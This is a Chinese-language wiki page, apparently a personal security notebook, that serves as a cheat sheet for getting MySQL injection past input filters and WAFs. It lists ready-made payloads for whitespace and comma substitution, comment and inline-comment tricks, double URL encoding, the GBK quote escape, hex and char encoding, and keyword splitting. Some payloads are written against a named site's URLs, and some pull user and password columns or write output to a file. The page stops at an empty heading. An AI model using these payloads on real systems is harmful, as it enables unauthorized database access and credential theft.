<!DOCTYPE HTML>
<html>
    <head>
        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
        <title>mysql注入过滤 - Wiki | janes</title>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <div id="container">
            
<div id="header">
  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;mysql注入过滤</div>
</div>
<div class="clearfix"></div>
<div id="title">mysql注入过滤</div>
  <div id="content">
  <h2 id="_1">过滤识别</h2>
<h3 id="_2">查找关键字</h3>
<div class="hlcode"><pre><span class="n">and</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
<span class="n">and</span> <span class="o">=</span>
<span class="n">and</span> <span class="mi">1</span>
<span class="n">and</span> <span class="p">(</span><span class="n">select</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">and</span> <span class="k">union</span>
<span class="n">and</span> <span class="k">union</span> <span class="n">select</span>
<span class="n">and</span> <span class="k">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span>
<span class="n">and</span> <span class="k">union</span><span class="cm">/**/</span><span class="n">select</span><span class="cm">/**/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span>
<span class="n">and</span> <span class="n">select</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2078</span><span class="o">-</span><span class="mi">1</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2078</span><span class="o">-</span><span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">2077</span><span class="o">-</span><span class="n">mid</span><span class="p">(</span><span class="mi">123</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</pre></div>


<h3 id="_3">识别关键词边界</h3>
<div class="hlcode"><pre><span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">8E0u</span><span class="n">nion</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">0</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">8.0</span><span class="k">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">0</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="err">\</span><span class="n">Nunion</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">0</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="o">-</span><span class="mf">.1</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="o">!</span><span class="mf">.1</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="o">~</span><span class="mf">.1</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="err">`</span><span class="n">host</span><span class="err">`</span><span class="n">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="sc">&#39;1&#39;</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="s">&quot;1&quot;</span>
<span class="n">where</span> <span class="n">id</span><span class="o">=</span><span class="mf">.1</span><span class="k">union</span><span class="cm">/*.1*/</span><span class="n">select</span><span class="err">@</span><span class="mi">1</span>
</pre></div>


<h2 id="_4">特殊符号绕过</h2>
<h3 id="_5">过滤空格</h3>
<p>在MySQL中可替换为：</p>
<div class="hlcode"><pre><span class="n">SQL</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span><span class="err">`</span><span class="n">user</span><span class="err">`</span><span class="p">;</span>
<span class="n">SQL</span><span class="o">&gt;</span> <span class="err">&#39;</span><span class="n">and</span><span class="p">(</span><span class="nb">true</span><span class="p">)</span><span class="n">like</span><span class="p">(</span><span class="nb">false</span><span class="p">)</span><span class="k">union</span><span class="p">(</span><span class="n">select</span><span class="p">(</span><span class="n">pass</span><span class="p">)</span><span class="n">from</span><span class="p">(</span><span class="n">users</span><span class="p">))</span><span class="err">#</span>
</pre></div>


<p>空格可以使用如下替代：</p>
<blockquote>
<p>在php中 \s 会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20</p>
</blockquote>
<div class="hlcode"><pre><span class="mi">09</span><span class="err">：</span><span class="n">Horizontal</span> <span class="n">Tab</span>
<span class="mi">0</span><span class="n">A</span><span class="err">：</span><span class="n">New</span> <span class="n">Line</span>
<span class="mi">0</span><span class="n">B</span><span class="err">：</span><span class="n">Vertical</span> <span class="n">Tab</span>
<span class="mi">0</span><span class="n">C</span><span class="err">：</span><span class="n">New</span> <span class="n">Page</span>
<span class="mi">0</span><span class="n">D</span><span class="err">：</span><span class="n">Carriage</span> <span class="n">Return</span>
<span class="n">A0</span><span class="err">：</span><span class="n">Non</span><span class="o">-</span><span class="n">breaking</span> <span class="n">Space</span>
<span class="mi">20</span><span class="err">：</span><span class="n">Space</span>
<span class="n">a0</span><span class="err">：空格</span>
<span class="mi">2</span><span class="n">B</span><span class="err">：</span><span class="o">+</span>
<span class="mi">2</span><span class="n">D</span><span class="err">：</span><span class="o">-</span>
<span class="mi">7</span><span class="n">E</span><span class="err">：</span><span class="o">~</span>
<span class="mi">21</span><span class="err">：</span><span class="o">!</span>
<span class="mi">40</span><span class="err">：@</span>
</pre></div>


<p>空格替换为：#Xburne%0a</p>
<p>在特定数据库中可以使用以下替代：</p>
<div class="hlcode"><pre><span class="n">SQLite3</span><span class="err">：</span><span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">C</span> <span class="mi">09</span> <span class="mi">20</span>
<span class="n">MySQL5</span> <span class="mi">09</span><span class="err">：</span><span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">B</span> <span class="mi">0</span><span class="n">C</span> <span class="mi">0</span><span class="n">D</span> <span class="n">A0</span> <span class="mi">20</span>
<span class="n">PosgresSQL</span><span class="err">：</span><span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">C</span> <span class="mi">09</span> <span class="mi">20</span>
<span class="n">Oracle</span> <span class="mi">11</span><span class="n">g</span><span class="err">：</span><span class="mo">00</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">0</span><span class="n">D</span> <span class="mi">0</span><span class="n">C</span> <span class="mi">09</span> <span class="mi">20</span>
<span class="n">MSSQL</span><span class="err">：</span><span class="mo">01</span><span class="p">,</span><span class="mo">02</span><span class="p">,</span><span class="mo">03</span><span class="p">,</span><span class="mo">04</span><span class="p">,</span><span class="mo">05</span><span class="p">,</span><span class="mo">06</span><span class="p">,</span><span class="mo">07</span><span class="p">,</span><span class="mi">08</span><span class="p">,</span><span class="mi">09</span><span class="p">,</span><span class="mi">0</span><span class="n">A</span><span class="p">,</span><span class="mi">0</span><span class="n">B</span><span class="p">,</span><span class="mi">0</span><span class="n">C</span><span class="p">,</span><span class="mi">0</span><span class="n">D</span><span class="p">,</span><span class="mi">0</span><span class="n">E</span><span class="p">,</span><span class="mf">0F</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">1</span><span class="n">A</span><span class="p">,</span><span class="mi">1</span><span class="n">B</span><span class="p">,</span><span class="mi">1</span><span class="n">C</span><span class="p">,</span><span class="mi">1</span><span class="n">D</span><span class="p">,</span><span class="mi">1</span><span class="n">E</span><span class="p">,</span><span class="mf">1F</span><span class="p">,</span><span class="mi">20</span>
</pre></div>


<p>示例：</p>
<div class="hlcode"><pre><span class="n">SELECT</span> <span class="mi">1</span> <span class="n">FROM</span> <span class="n">dual</span> <span class="n">WHERE</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="n">AND</span><span class="o">-+-+-+-+~~</span><span class="p">((</span><span class="mi">1</span><span class="p">))</span>
<span class="err">&#39;</span> <span class="n">or</span> <span class="o">--+</span><span class="mi">2</span><span class="o">=-</span> <span class="o">-!!!</span><span class="err">&#39;</span><span class="mi">2</span>
</pre></div>


<h3 id="_6">过滤逗号</h3>
<p>使用语法绕过：</p>
<div class="hlcode"><pre><span class="n">SQL</span><span class="o">&gt;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="o">*</span> <span class="n">FROM</span> <span class="p">((</span><span class="n">SELECT</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="n">JOIN</span> <span class="p">(</span><span class="n">SELECT</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span> <span class="n">JOIN</span> <span class="p">(</span><span class="n">SELECT</span> <span class="mi">3</span><span class="p">)</span><span class="n">c</span><span class="p">);</span>
<span class="err">实际上也就相当于：</span>
<span class="n">SQL</span><span class="o">&gt;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span>
</pre></div>


<h3 id="_7">过滤 = ( '</h3>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="mi">1</span> <span class="k">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="n">where</span> <span class="n">table_name</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">users</span><span class="err">&#39;</span>
<span class="err">过滤：</span><span class="mi">1</span> <span class="k">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="n">where</span> <span class="n">table_name</span> <span class="n">between</span> <span class="sc">&#39;a&#39;</span> <span class="n">and</span> <span class="sc">&#39;z&#39;</span>
<span class="err">过滤：</span><span class="mi">1</span> <span class="k">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="n">where</span> <span class="n">table_name</span> <span class="n">between</span> <span class="kt">char</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span> <span class="n">and</span> <span class="kt">char</span><span class="p">(</span><span class="mi">122</span><span class="p">)</span>

<span class="err">绕过：</span><span class="mi">1</span> <span class="k">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="n">where</span> <span class="n">table_name</span> <span class="n">between</span> <span class="mh">0x61</span> <span class="n">and</span> <span class="mh">0x7a</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="k">union</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span> <span class="n">table_name</span> <span class="n">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="n">where</span> <span class="n">table_name</span> <span class="n">like</span> <span class="mh">0x7573657273</span>
</pre></div>


<h3 id="_8">单双引号</h3>
<div class="hlcode"><pre><span class="n">GBK</span><span class="err">编码</span> <span class="o">%</span><span class="n">df</span><span class="err">&#39;</span>
<span class="n">UNICODE</span><span class="err">编码</span> <span class="o">%</span><span class="mi">2527</span>
</pre></div>


<p>单引号逃逸：</p>
<ul>
<li>\</li>
</ul>
<div class="hlcode"><pre><span class="cp"># 用户名为username</span>
<span class="n">SQL</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">db</span> <span class="n">where</span> <span class="n">name</span><span class="o">=</span><span class="err">&#39;</span><span class="n">username</span><span class="err">\&#39;</span> <span class="n">and</span> <span class="n">passwd</span><span class="o">=</span><span class="err">&#39;</span> <span class="n">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="err">#</span>
</pre></div>


<h3 id="_9">过滤 //</h3>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.90jishuwang.com/main/news/id/1/X362X*/||/**/lpad(first_name,7,1).html</span>
<span class="err">绕过：</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.90jishuwang.com/main/news/id/1%0b||%0blpad(first_name,7,1).html</span>
</pre></div>


<h2 id="_10">注释和编码绕过</h2>
<h3 id="_11">注释符</h3>
<div class="hlcode"><pre><span class="cp"># %23</span>
<span class="o">--</span> <span class="err">后面要加空格</span>
<span class="cm">/**/</span> <span class="err">只加前半个也行</span>
<span class="p">;</span><span class="o">%</span><span class="mo">00</span> <span class="n">Nullbyte</span>
<span class="err">`</span> <span class="n">Backtick</span>
</pre></div>


<div class="hlcode"><pre><span class="n">SQL</span><span class="o">&gt;</span> <span class="mi">1</span><span class="o">+</span><span class="n">un</span><span class="cm">/**/</span><span class="n">ion</span><span class="o">+</span><span class="n">se</span><span class="cm">/**/</span><span class="n">lect</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="o">--</span> <span class="err">空格</span>
</pre></div>


<h3 id="_12">巧用注释和编码：</h3>
<div class="hlcode"><pre><span class="err">绕过：</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.90jishuwang.com/news.php?id=0+div+1+union%23fooX381X%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user</span>
<span class="err">解析：</span>
<span class="mi">0</span> <span class="n">div</span> <span class="mi">1</span> <span class="k">union</span><span class="err">#</span><span class="n">foo</span><span class="err">*/*/</span><span class="n">bar</span>
<span class="n">select</span><span class="err">#</span><span class="n">foo</span>
<span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">current_user</span>
</pre></div>


<p>MySQL Inline Comments：</p>
<div class="hlcode"><pre><span class="cm">/*!12345select*//*!12345user*/</span> <span class="n">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">user</span><span class="p">;</span>
<span class="err">绕过：</span><span class="nl">http:</span><span class="c1">//www.90jishuwang.com/news.php?id=1/*!12345!UnIoN*/SeLecT+1,2,3 --</span>
</pre></div>


<h3 id="_13">双编码</h3>
<p>多次解析：
%2527解析后是%27再解析是'</p>
<div class="hlcode"><pre><span class="err">绕过：</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.90jishuwang.com/news.php?id=1%252f%252aX396X/union%252f%252a /select%252f%252a*/1,2,3%252f%252a*/from%252f%252a*/users --</span>
</pre></div>


<h3 id="_14">编码组合</h3>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.90jishuwang.com/php-nuke/?/X401X*/union/**/select?</span>
<span class="err">绕过：</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.90jishuwang.com/php-nuke/?/%2A%2A/union/%2A%2A/select?</span>
<span class="err">绕过：</span><span class="n">http</span><span class="o">:</span><span class="c1">//www.90jishuwang.com/php-nuke/?%2fX405X*%2funion%2f**%2fselect?</span>
</pre></div>


<h3 id="_15">中文字符绕过</h3>
<div class="hlcode"><pre><span class="n">SQL</span><span class="o">&gt;</span> <span class="k">union</span><span class="cm">/*%aa*/</span><span class="n">select</span>
</pre></div>


<p>利用 union/<em>中文字符</em>/select，还要保证这种中文字符不能构造一个汉字。</p>
<h3 id="_16">进制换算</h3>
<div class="hlcode"><pre><span class="err">&#39;</span> <span class="n">or</span> <span class="sc">&#39;a&#39;</span> <span class="o">=</span> <span class="n">n</span><span class="err">&#39;</span><span class="n">a</span> <span class="err">#</span> <span class="n">unicode</span>
<span class="err">&#39;</span> <span class="o">%</span><span class="n">u0061nd</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span> <span class="err">#</span> <span class="n">unicode</span>
<span class="err">&#39;</span> <span class="n">or</span> <span class="sc">&#39;a&#39;</span> <span class="o">=</span> <span class="n">b</span><span class="err">&#39;</span><span class="mi">1100001</span> <span class="err">#</span> <span class="n">binary</span>
<span class="err">&#39;</span> <span class="n">or</span> <span class="sc">&#39;a&#39;</span> <span class="o">=</span> <span class="n">x</span><span class="err">&#39;</span><span class="mi">61</span> <span class="err">#</span> <span class="n">hexadecimal</span>
<span class="err">&#39;</span> <span class="n">and</span> <span class="n">substr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x61</span><span class="err">#</span> <span class="mh">0x6162</span>
<span class="err">&#39;</span> <span class="n">and</span> <span class="n">substr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">unhex</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span><span class="err">#</span> <span class="n">unhex</span><span class="p">(</span><span class="mi">6162</span><span class="p">)</span>
<span class="err">&#39;</span> <span class="n">and</span> <span class="n">substr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="kt">char</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="err">#</span> <span class="kt">char</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">98</span><span class="p">)</span>
<span class="err">&#39;</span> <span class="n">and</span> <span class="n">substr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">lower</span><span class="p">(</span><span class="n">conv</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">))</span><span class="err">#</span> <span class="sc">&#39;a&#39;</span>
<span class="err">&#39;</span> <span class="n">and</span> <span class="n">substr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">lower</span><span class="p">(</span><span class="n">conv</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">))</span><span class="err">#</span> <span class="sc">&#39;b&#39;</span>
<span class="err">&#39;</span> <span class="n">and</span> <span class="n">substr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">lower</span><span class="p">(</span><span class="n">conv</span><span class="p">(</span><span class="mi">36</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">))</span><span class="err">#</span> <span class="sc">&#39;z&#39;</span>
</pre></div>


<h2 id="_17">语法绕过</h2>
<h3 id="_18">关键词绕过</h3>
<ul>
<li>过滤and，or可以使用&amp;&amp;和||</li>
</ul>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="mi">1</span> <span class="n">or</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span> <span class="mi">1</span> <span class="n">and</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span>
<span class="err">绕过：</span><span class="o">^</span><span class="p">,</span> <span class="o">=</span><span class="p">,</span> <span class="o">!=</span><span class="p">,</span> <span class="o">%</span><span class="p">,</span> <span class="o">/</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">,</span> <span class="o">&amp;&amp;</span><span class="p">,</span> <span class="o">|</span><span class="p">,</span> <span class="o">||</span><span class="p">,</span> <span class="o">&lt;</span><span class="p">,</span> <span class="o">&gt;</span><span class="p">,</span> <span class="o">&gt;&gt;</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="p">,</span> <span class="o">&gt;=</span><span class="p">,</span> <span class="o">&lt;=</span><span class="p">,</span> <span class="o">&lt;&gt;</span><span class="p">,</span> <span class="o">&lt;=&gt;</span><span class="p">,</span> <span class="n">XOR</span><span class="p">,</span> <span class="n">DIV</span><span class="p">,</span> <span class="n">SOUNDS</span> <span class="n">LIKE</span><span class="p">,</span> <span class="n">RLIKE</span><span class="p">,</span> <span class="n">REGEXP</span><span class="p">,</span> <span class="n">IS</span><span class="p">,</span> <span class="n">NOT</span><span class="p">,</span> <span class="n">BETWEEN</span><span class="p">,</span> <span class="p">...</span>
</pre></div>


<ul>
<li>同时过滤and，or，union</li>
</ul>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="k">union</span> <span class="n">select</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span> <span class="n">from</span> <span class="n">users</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">user</span> <span class="n">from</span> <span class="n">users</span> <span class="n">where</span> <span class="n">user_id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
</pre></div>


<ul>
<li>同时过滤and，or，union，where</li>
</ul>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">user</span> <span class="n">from</span> <span class="n">users</span> <span class="n">where</span> <span class="n">user_id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">user</span> <span class="n">from</span> <span class="n">users</span> <span class="n">limit</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
</pre></div>


<ul>
<li>同时过滤and，or，union，where，limit</li>
</ul>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">user</span> <span class="n">from</span> <span class="n">users</span> <span class="n">limit</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">user</span> <span class="n">from</span> <span class="n">users</span> <span class="n">group</span> <span class="n">by</span> <span class="n">user_id</span> <span class="n">having</span> <span class="n">user_id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
</pre></div>


<ul>
<li>同时过滤and，or，union，where，limit，group by</li>
</ul>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">user</span> <span class="n">from</span> <span class="n">users</span> <span class="n">group</span> <span class="n">by</span> <span class="n">user_id</span> <span class="n">having</span> <span class="n">user_id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">substr</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">user</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="n">from</span> <span class="n">users</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
</pre></div>


<ul>
<li>同时过滤and，or，union，where，limit，group by，select</li>
</ul>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="mi">1</span> <span class="o">||</span> <span class="p">(</span><span class="n">select</span> <span class="n">substr</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="n">user</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="n">from</span> <span class="n">users</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span> <span class="n">into</span> <span class="n">outfile</span> <span class="err">&#39;</span><span class="n">result</span><span class="p">.</span><span class="n">txt</span><span class="err">&#39;</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="n">substr</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">admin</span><span class="err">&#39;</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="n">user_id</span> <span class="n">is</span> <span class="n">not</span> <span class="n">null</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="n">substr</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x61</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="n">substr</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">unhex</span><span class="p">(</span><span class="mi">61</span><span class="p">)</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="n">substr</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">lower</span><span class="p">(</span><span class="n">conv</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">))</span>
</pre></div>


<ul>
<li>同时绕过and，or，union，where，limit，group by，select，hex，substr</li>
</ul>
<div class="hlcode"><pre><span class="err">过滤：</span><span class="mi">1</span> <span class="o">||</span> <span class="n">substr</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">lower</span><span class="p">(</span><span class="n">conv</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">36</span><span class="p">))</span>
<span class="err">绕过：</span><span class="mi">1</span> <span class="o">||</span> <span class="n">lpad</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
</pre></div>


<h3 id="_19">移除关键词</h3>
<div class="hlcode"><pre><span class="err">绕过：</span><span class="mi">1</span><span class="o">+</span><span class="n">UNunionION</span><span class="o">+</span><span class="n">SEselectLECT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="o">--</span>
<span class="err">绕过：</span><span class="mi">1</span><span class="o">+</span><span class="n">uni</span><span class="o">%</span><span class="mi">0</span><span class="n">bon</span><span class="o">+</span><span class="n">se</span><span class="o">%</span><span class="mi">0</span><span class="n">blect</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="o">--</span>
</pre></div>


<h3 id="_20">敏感函数</h3>
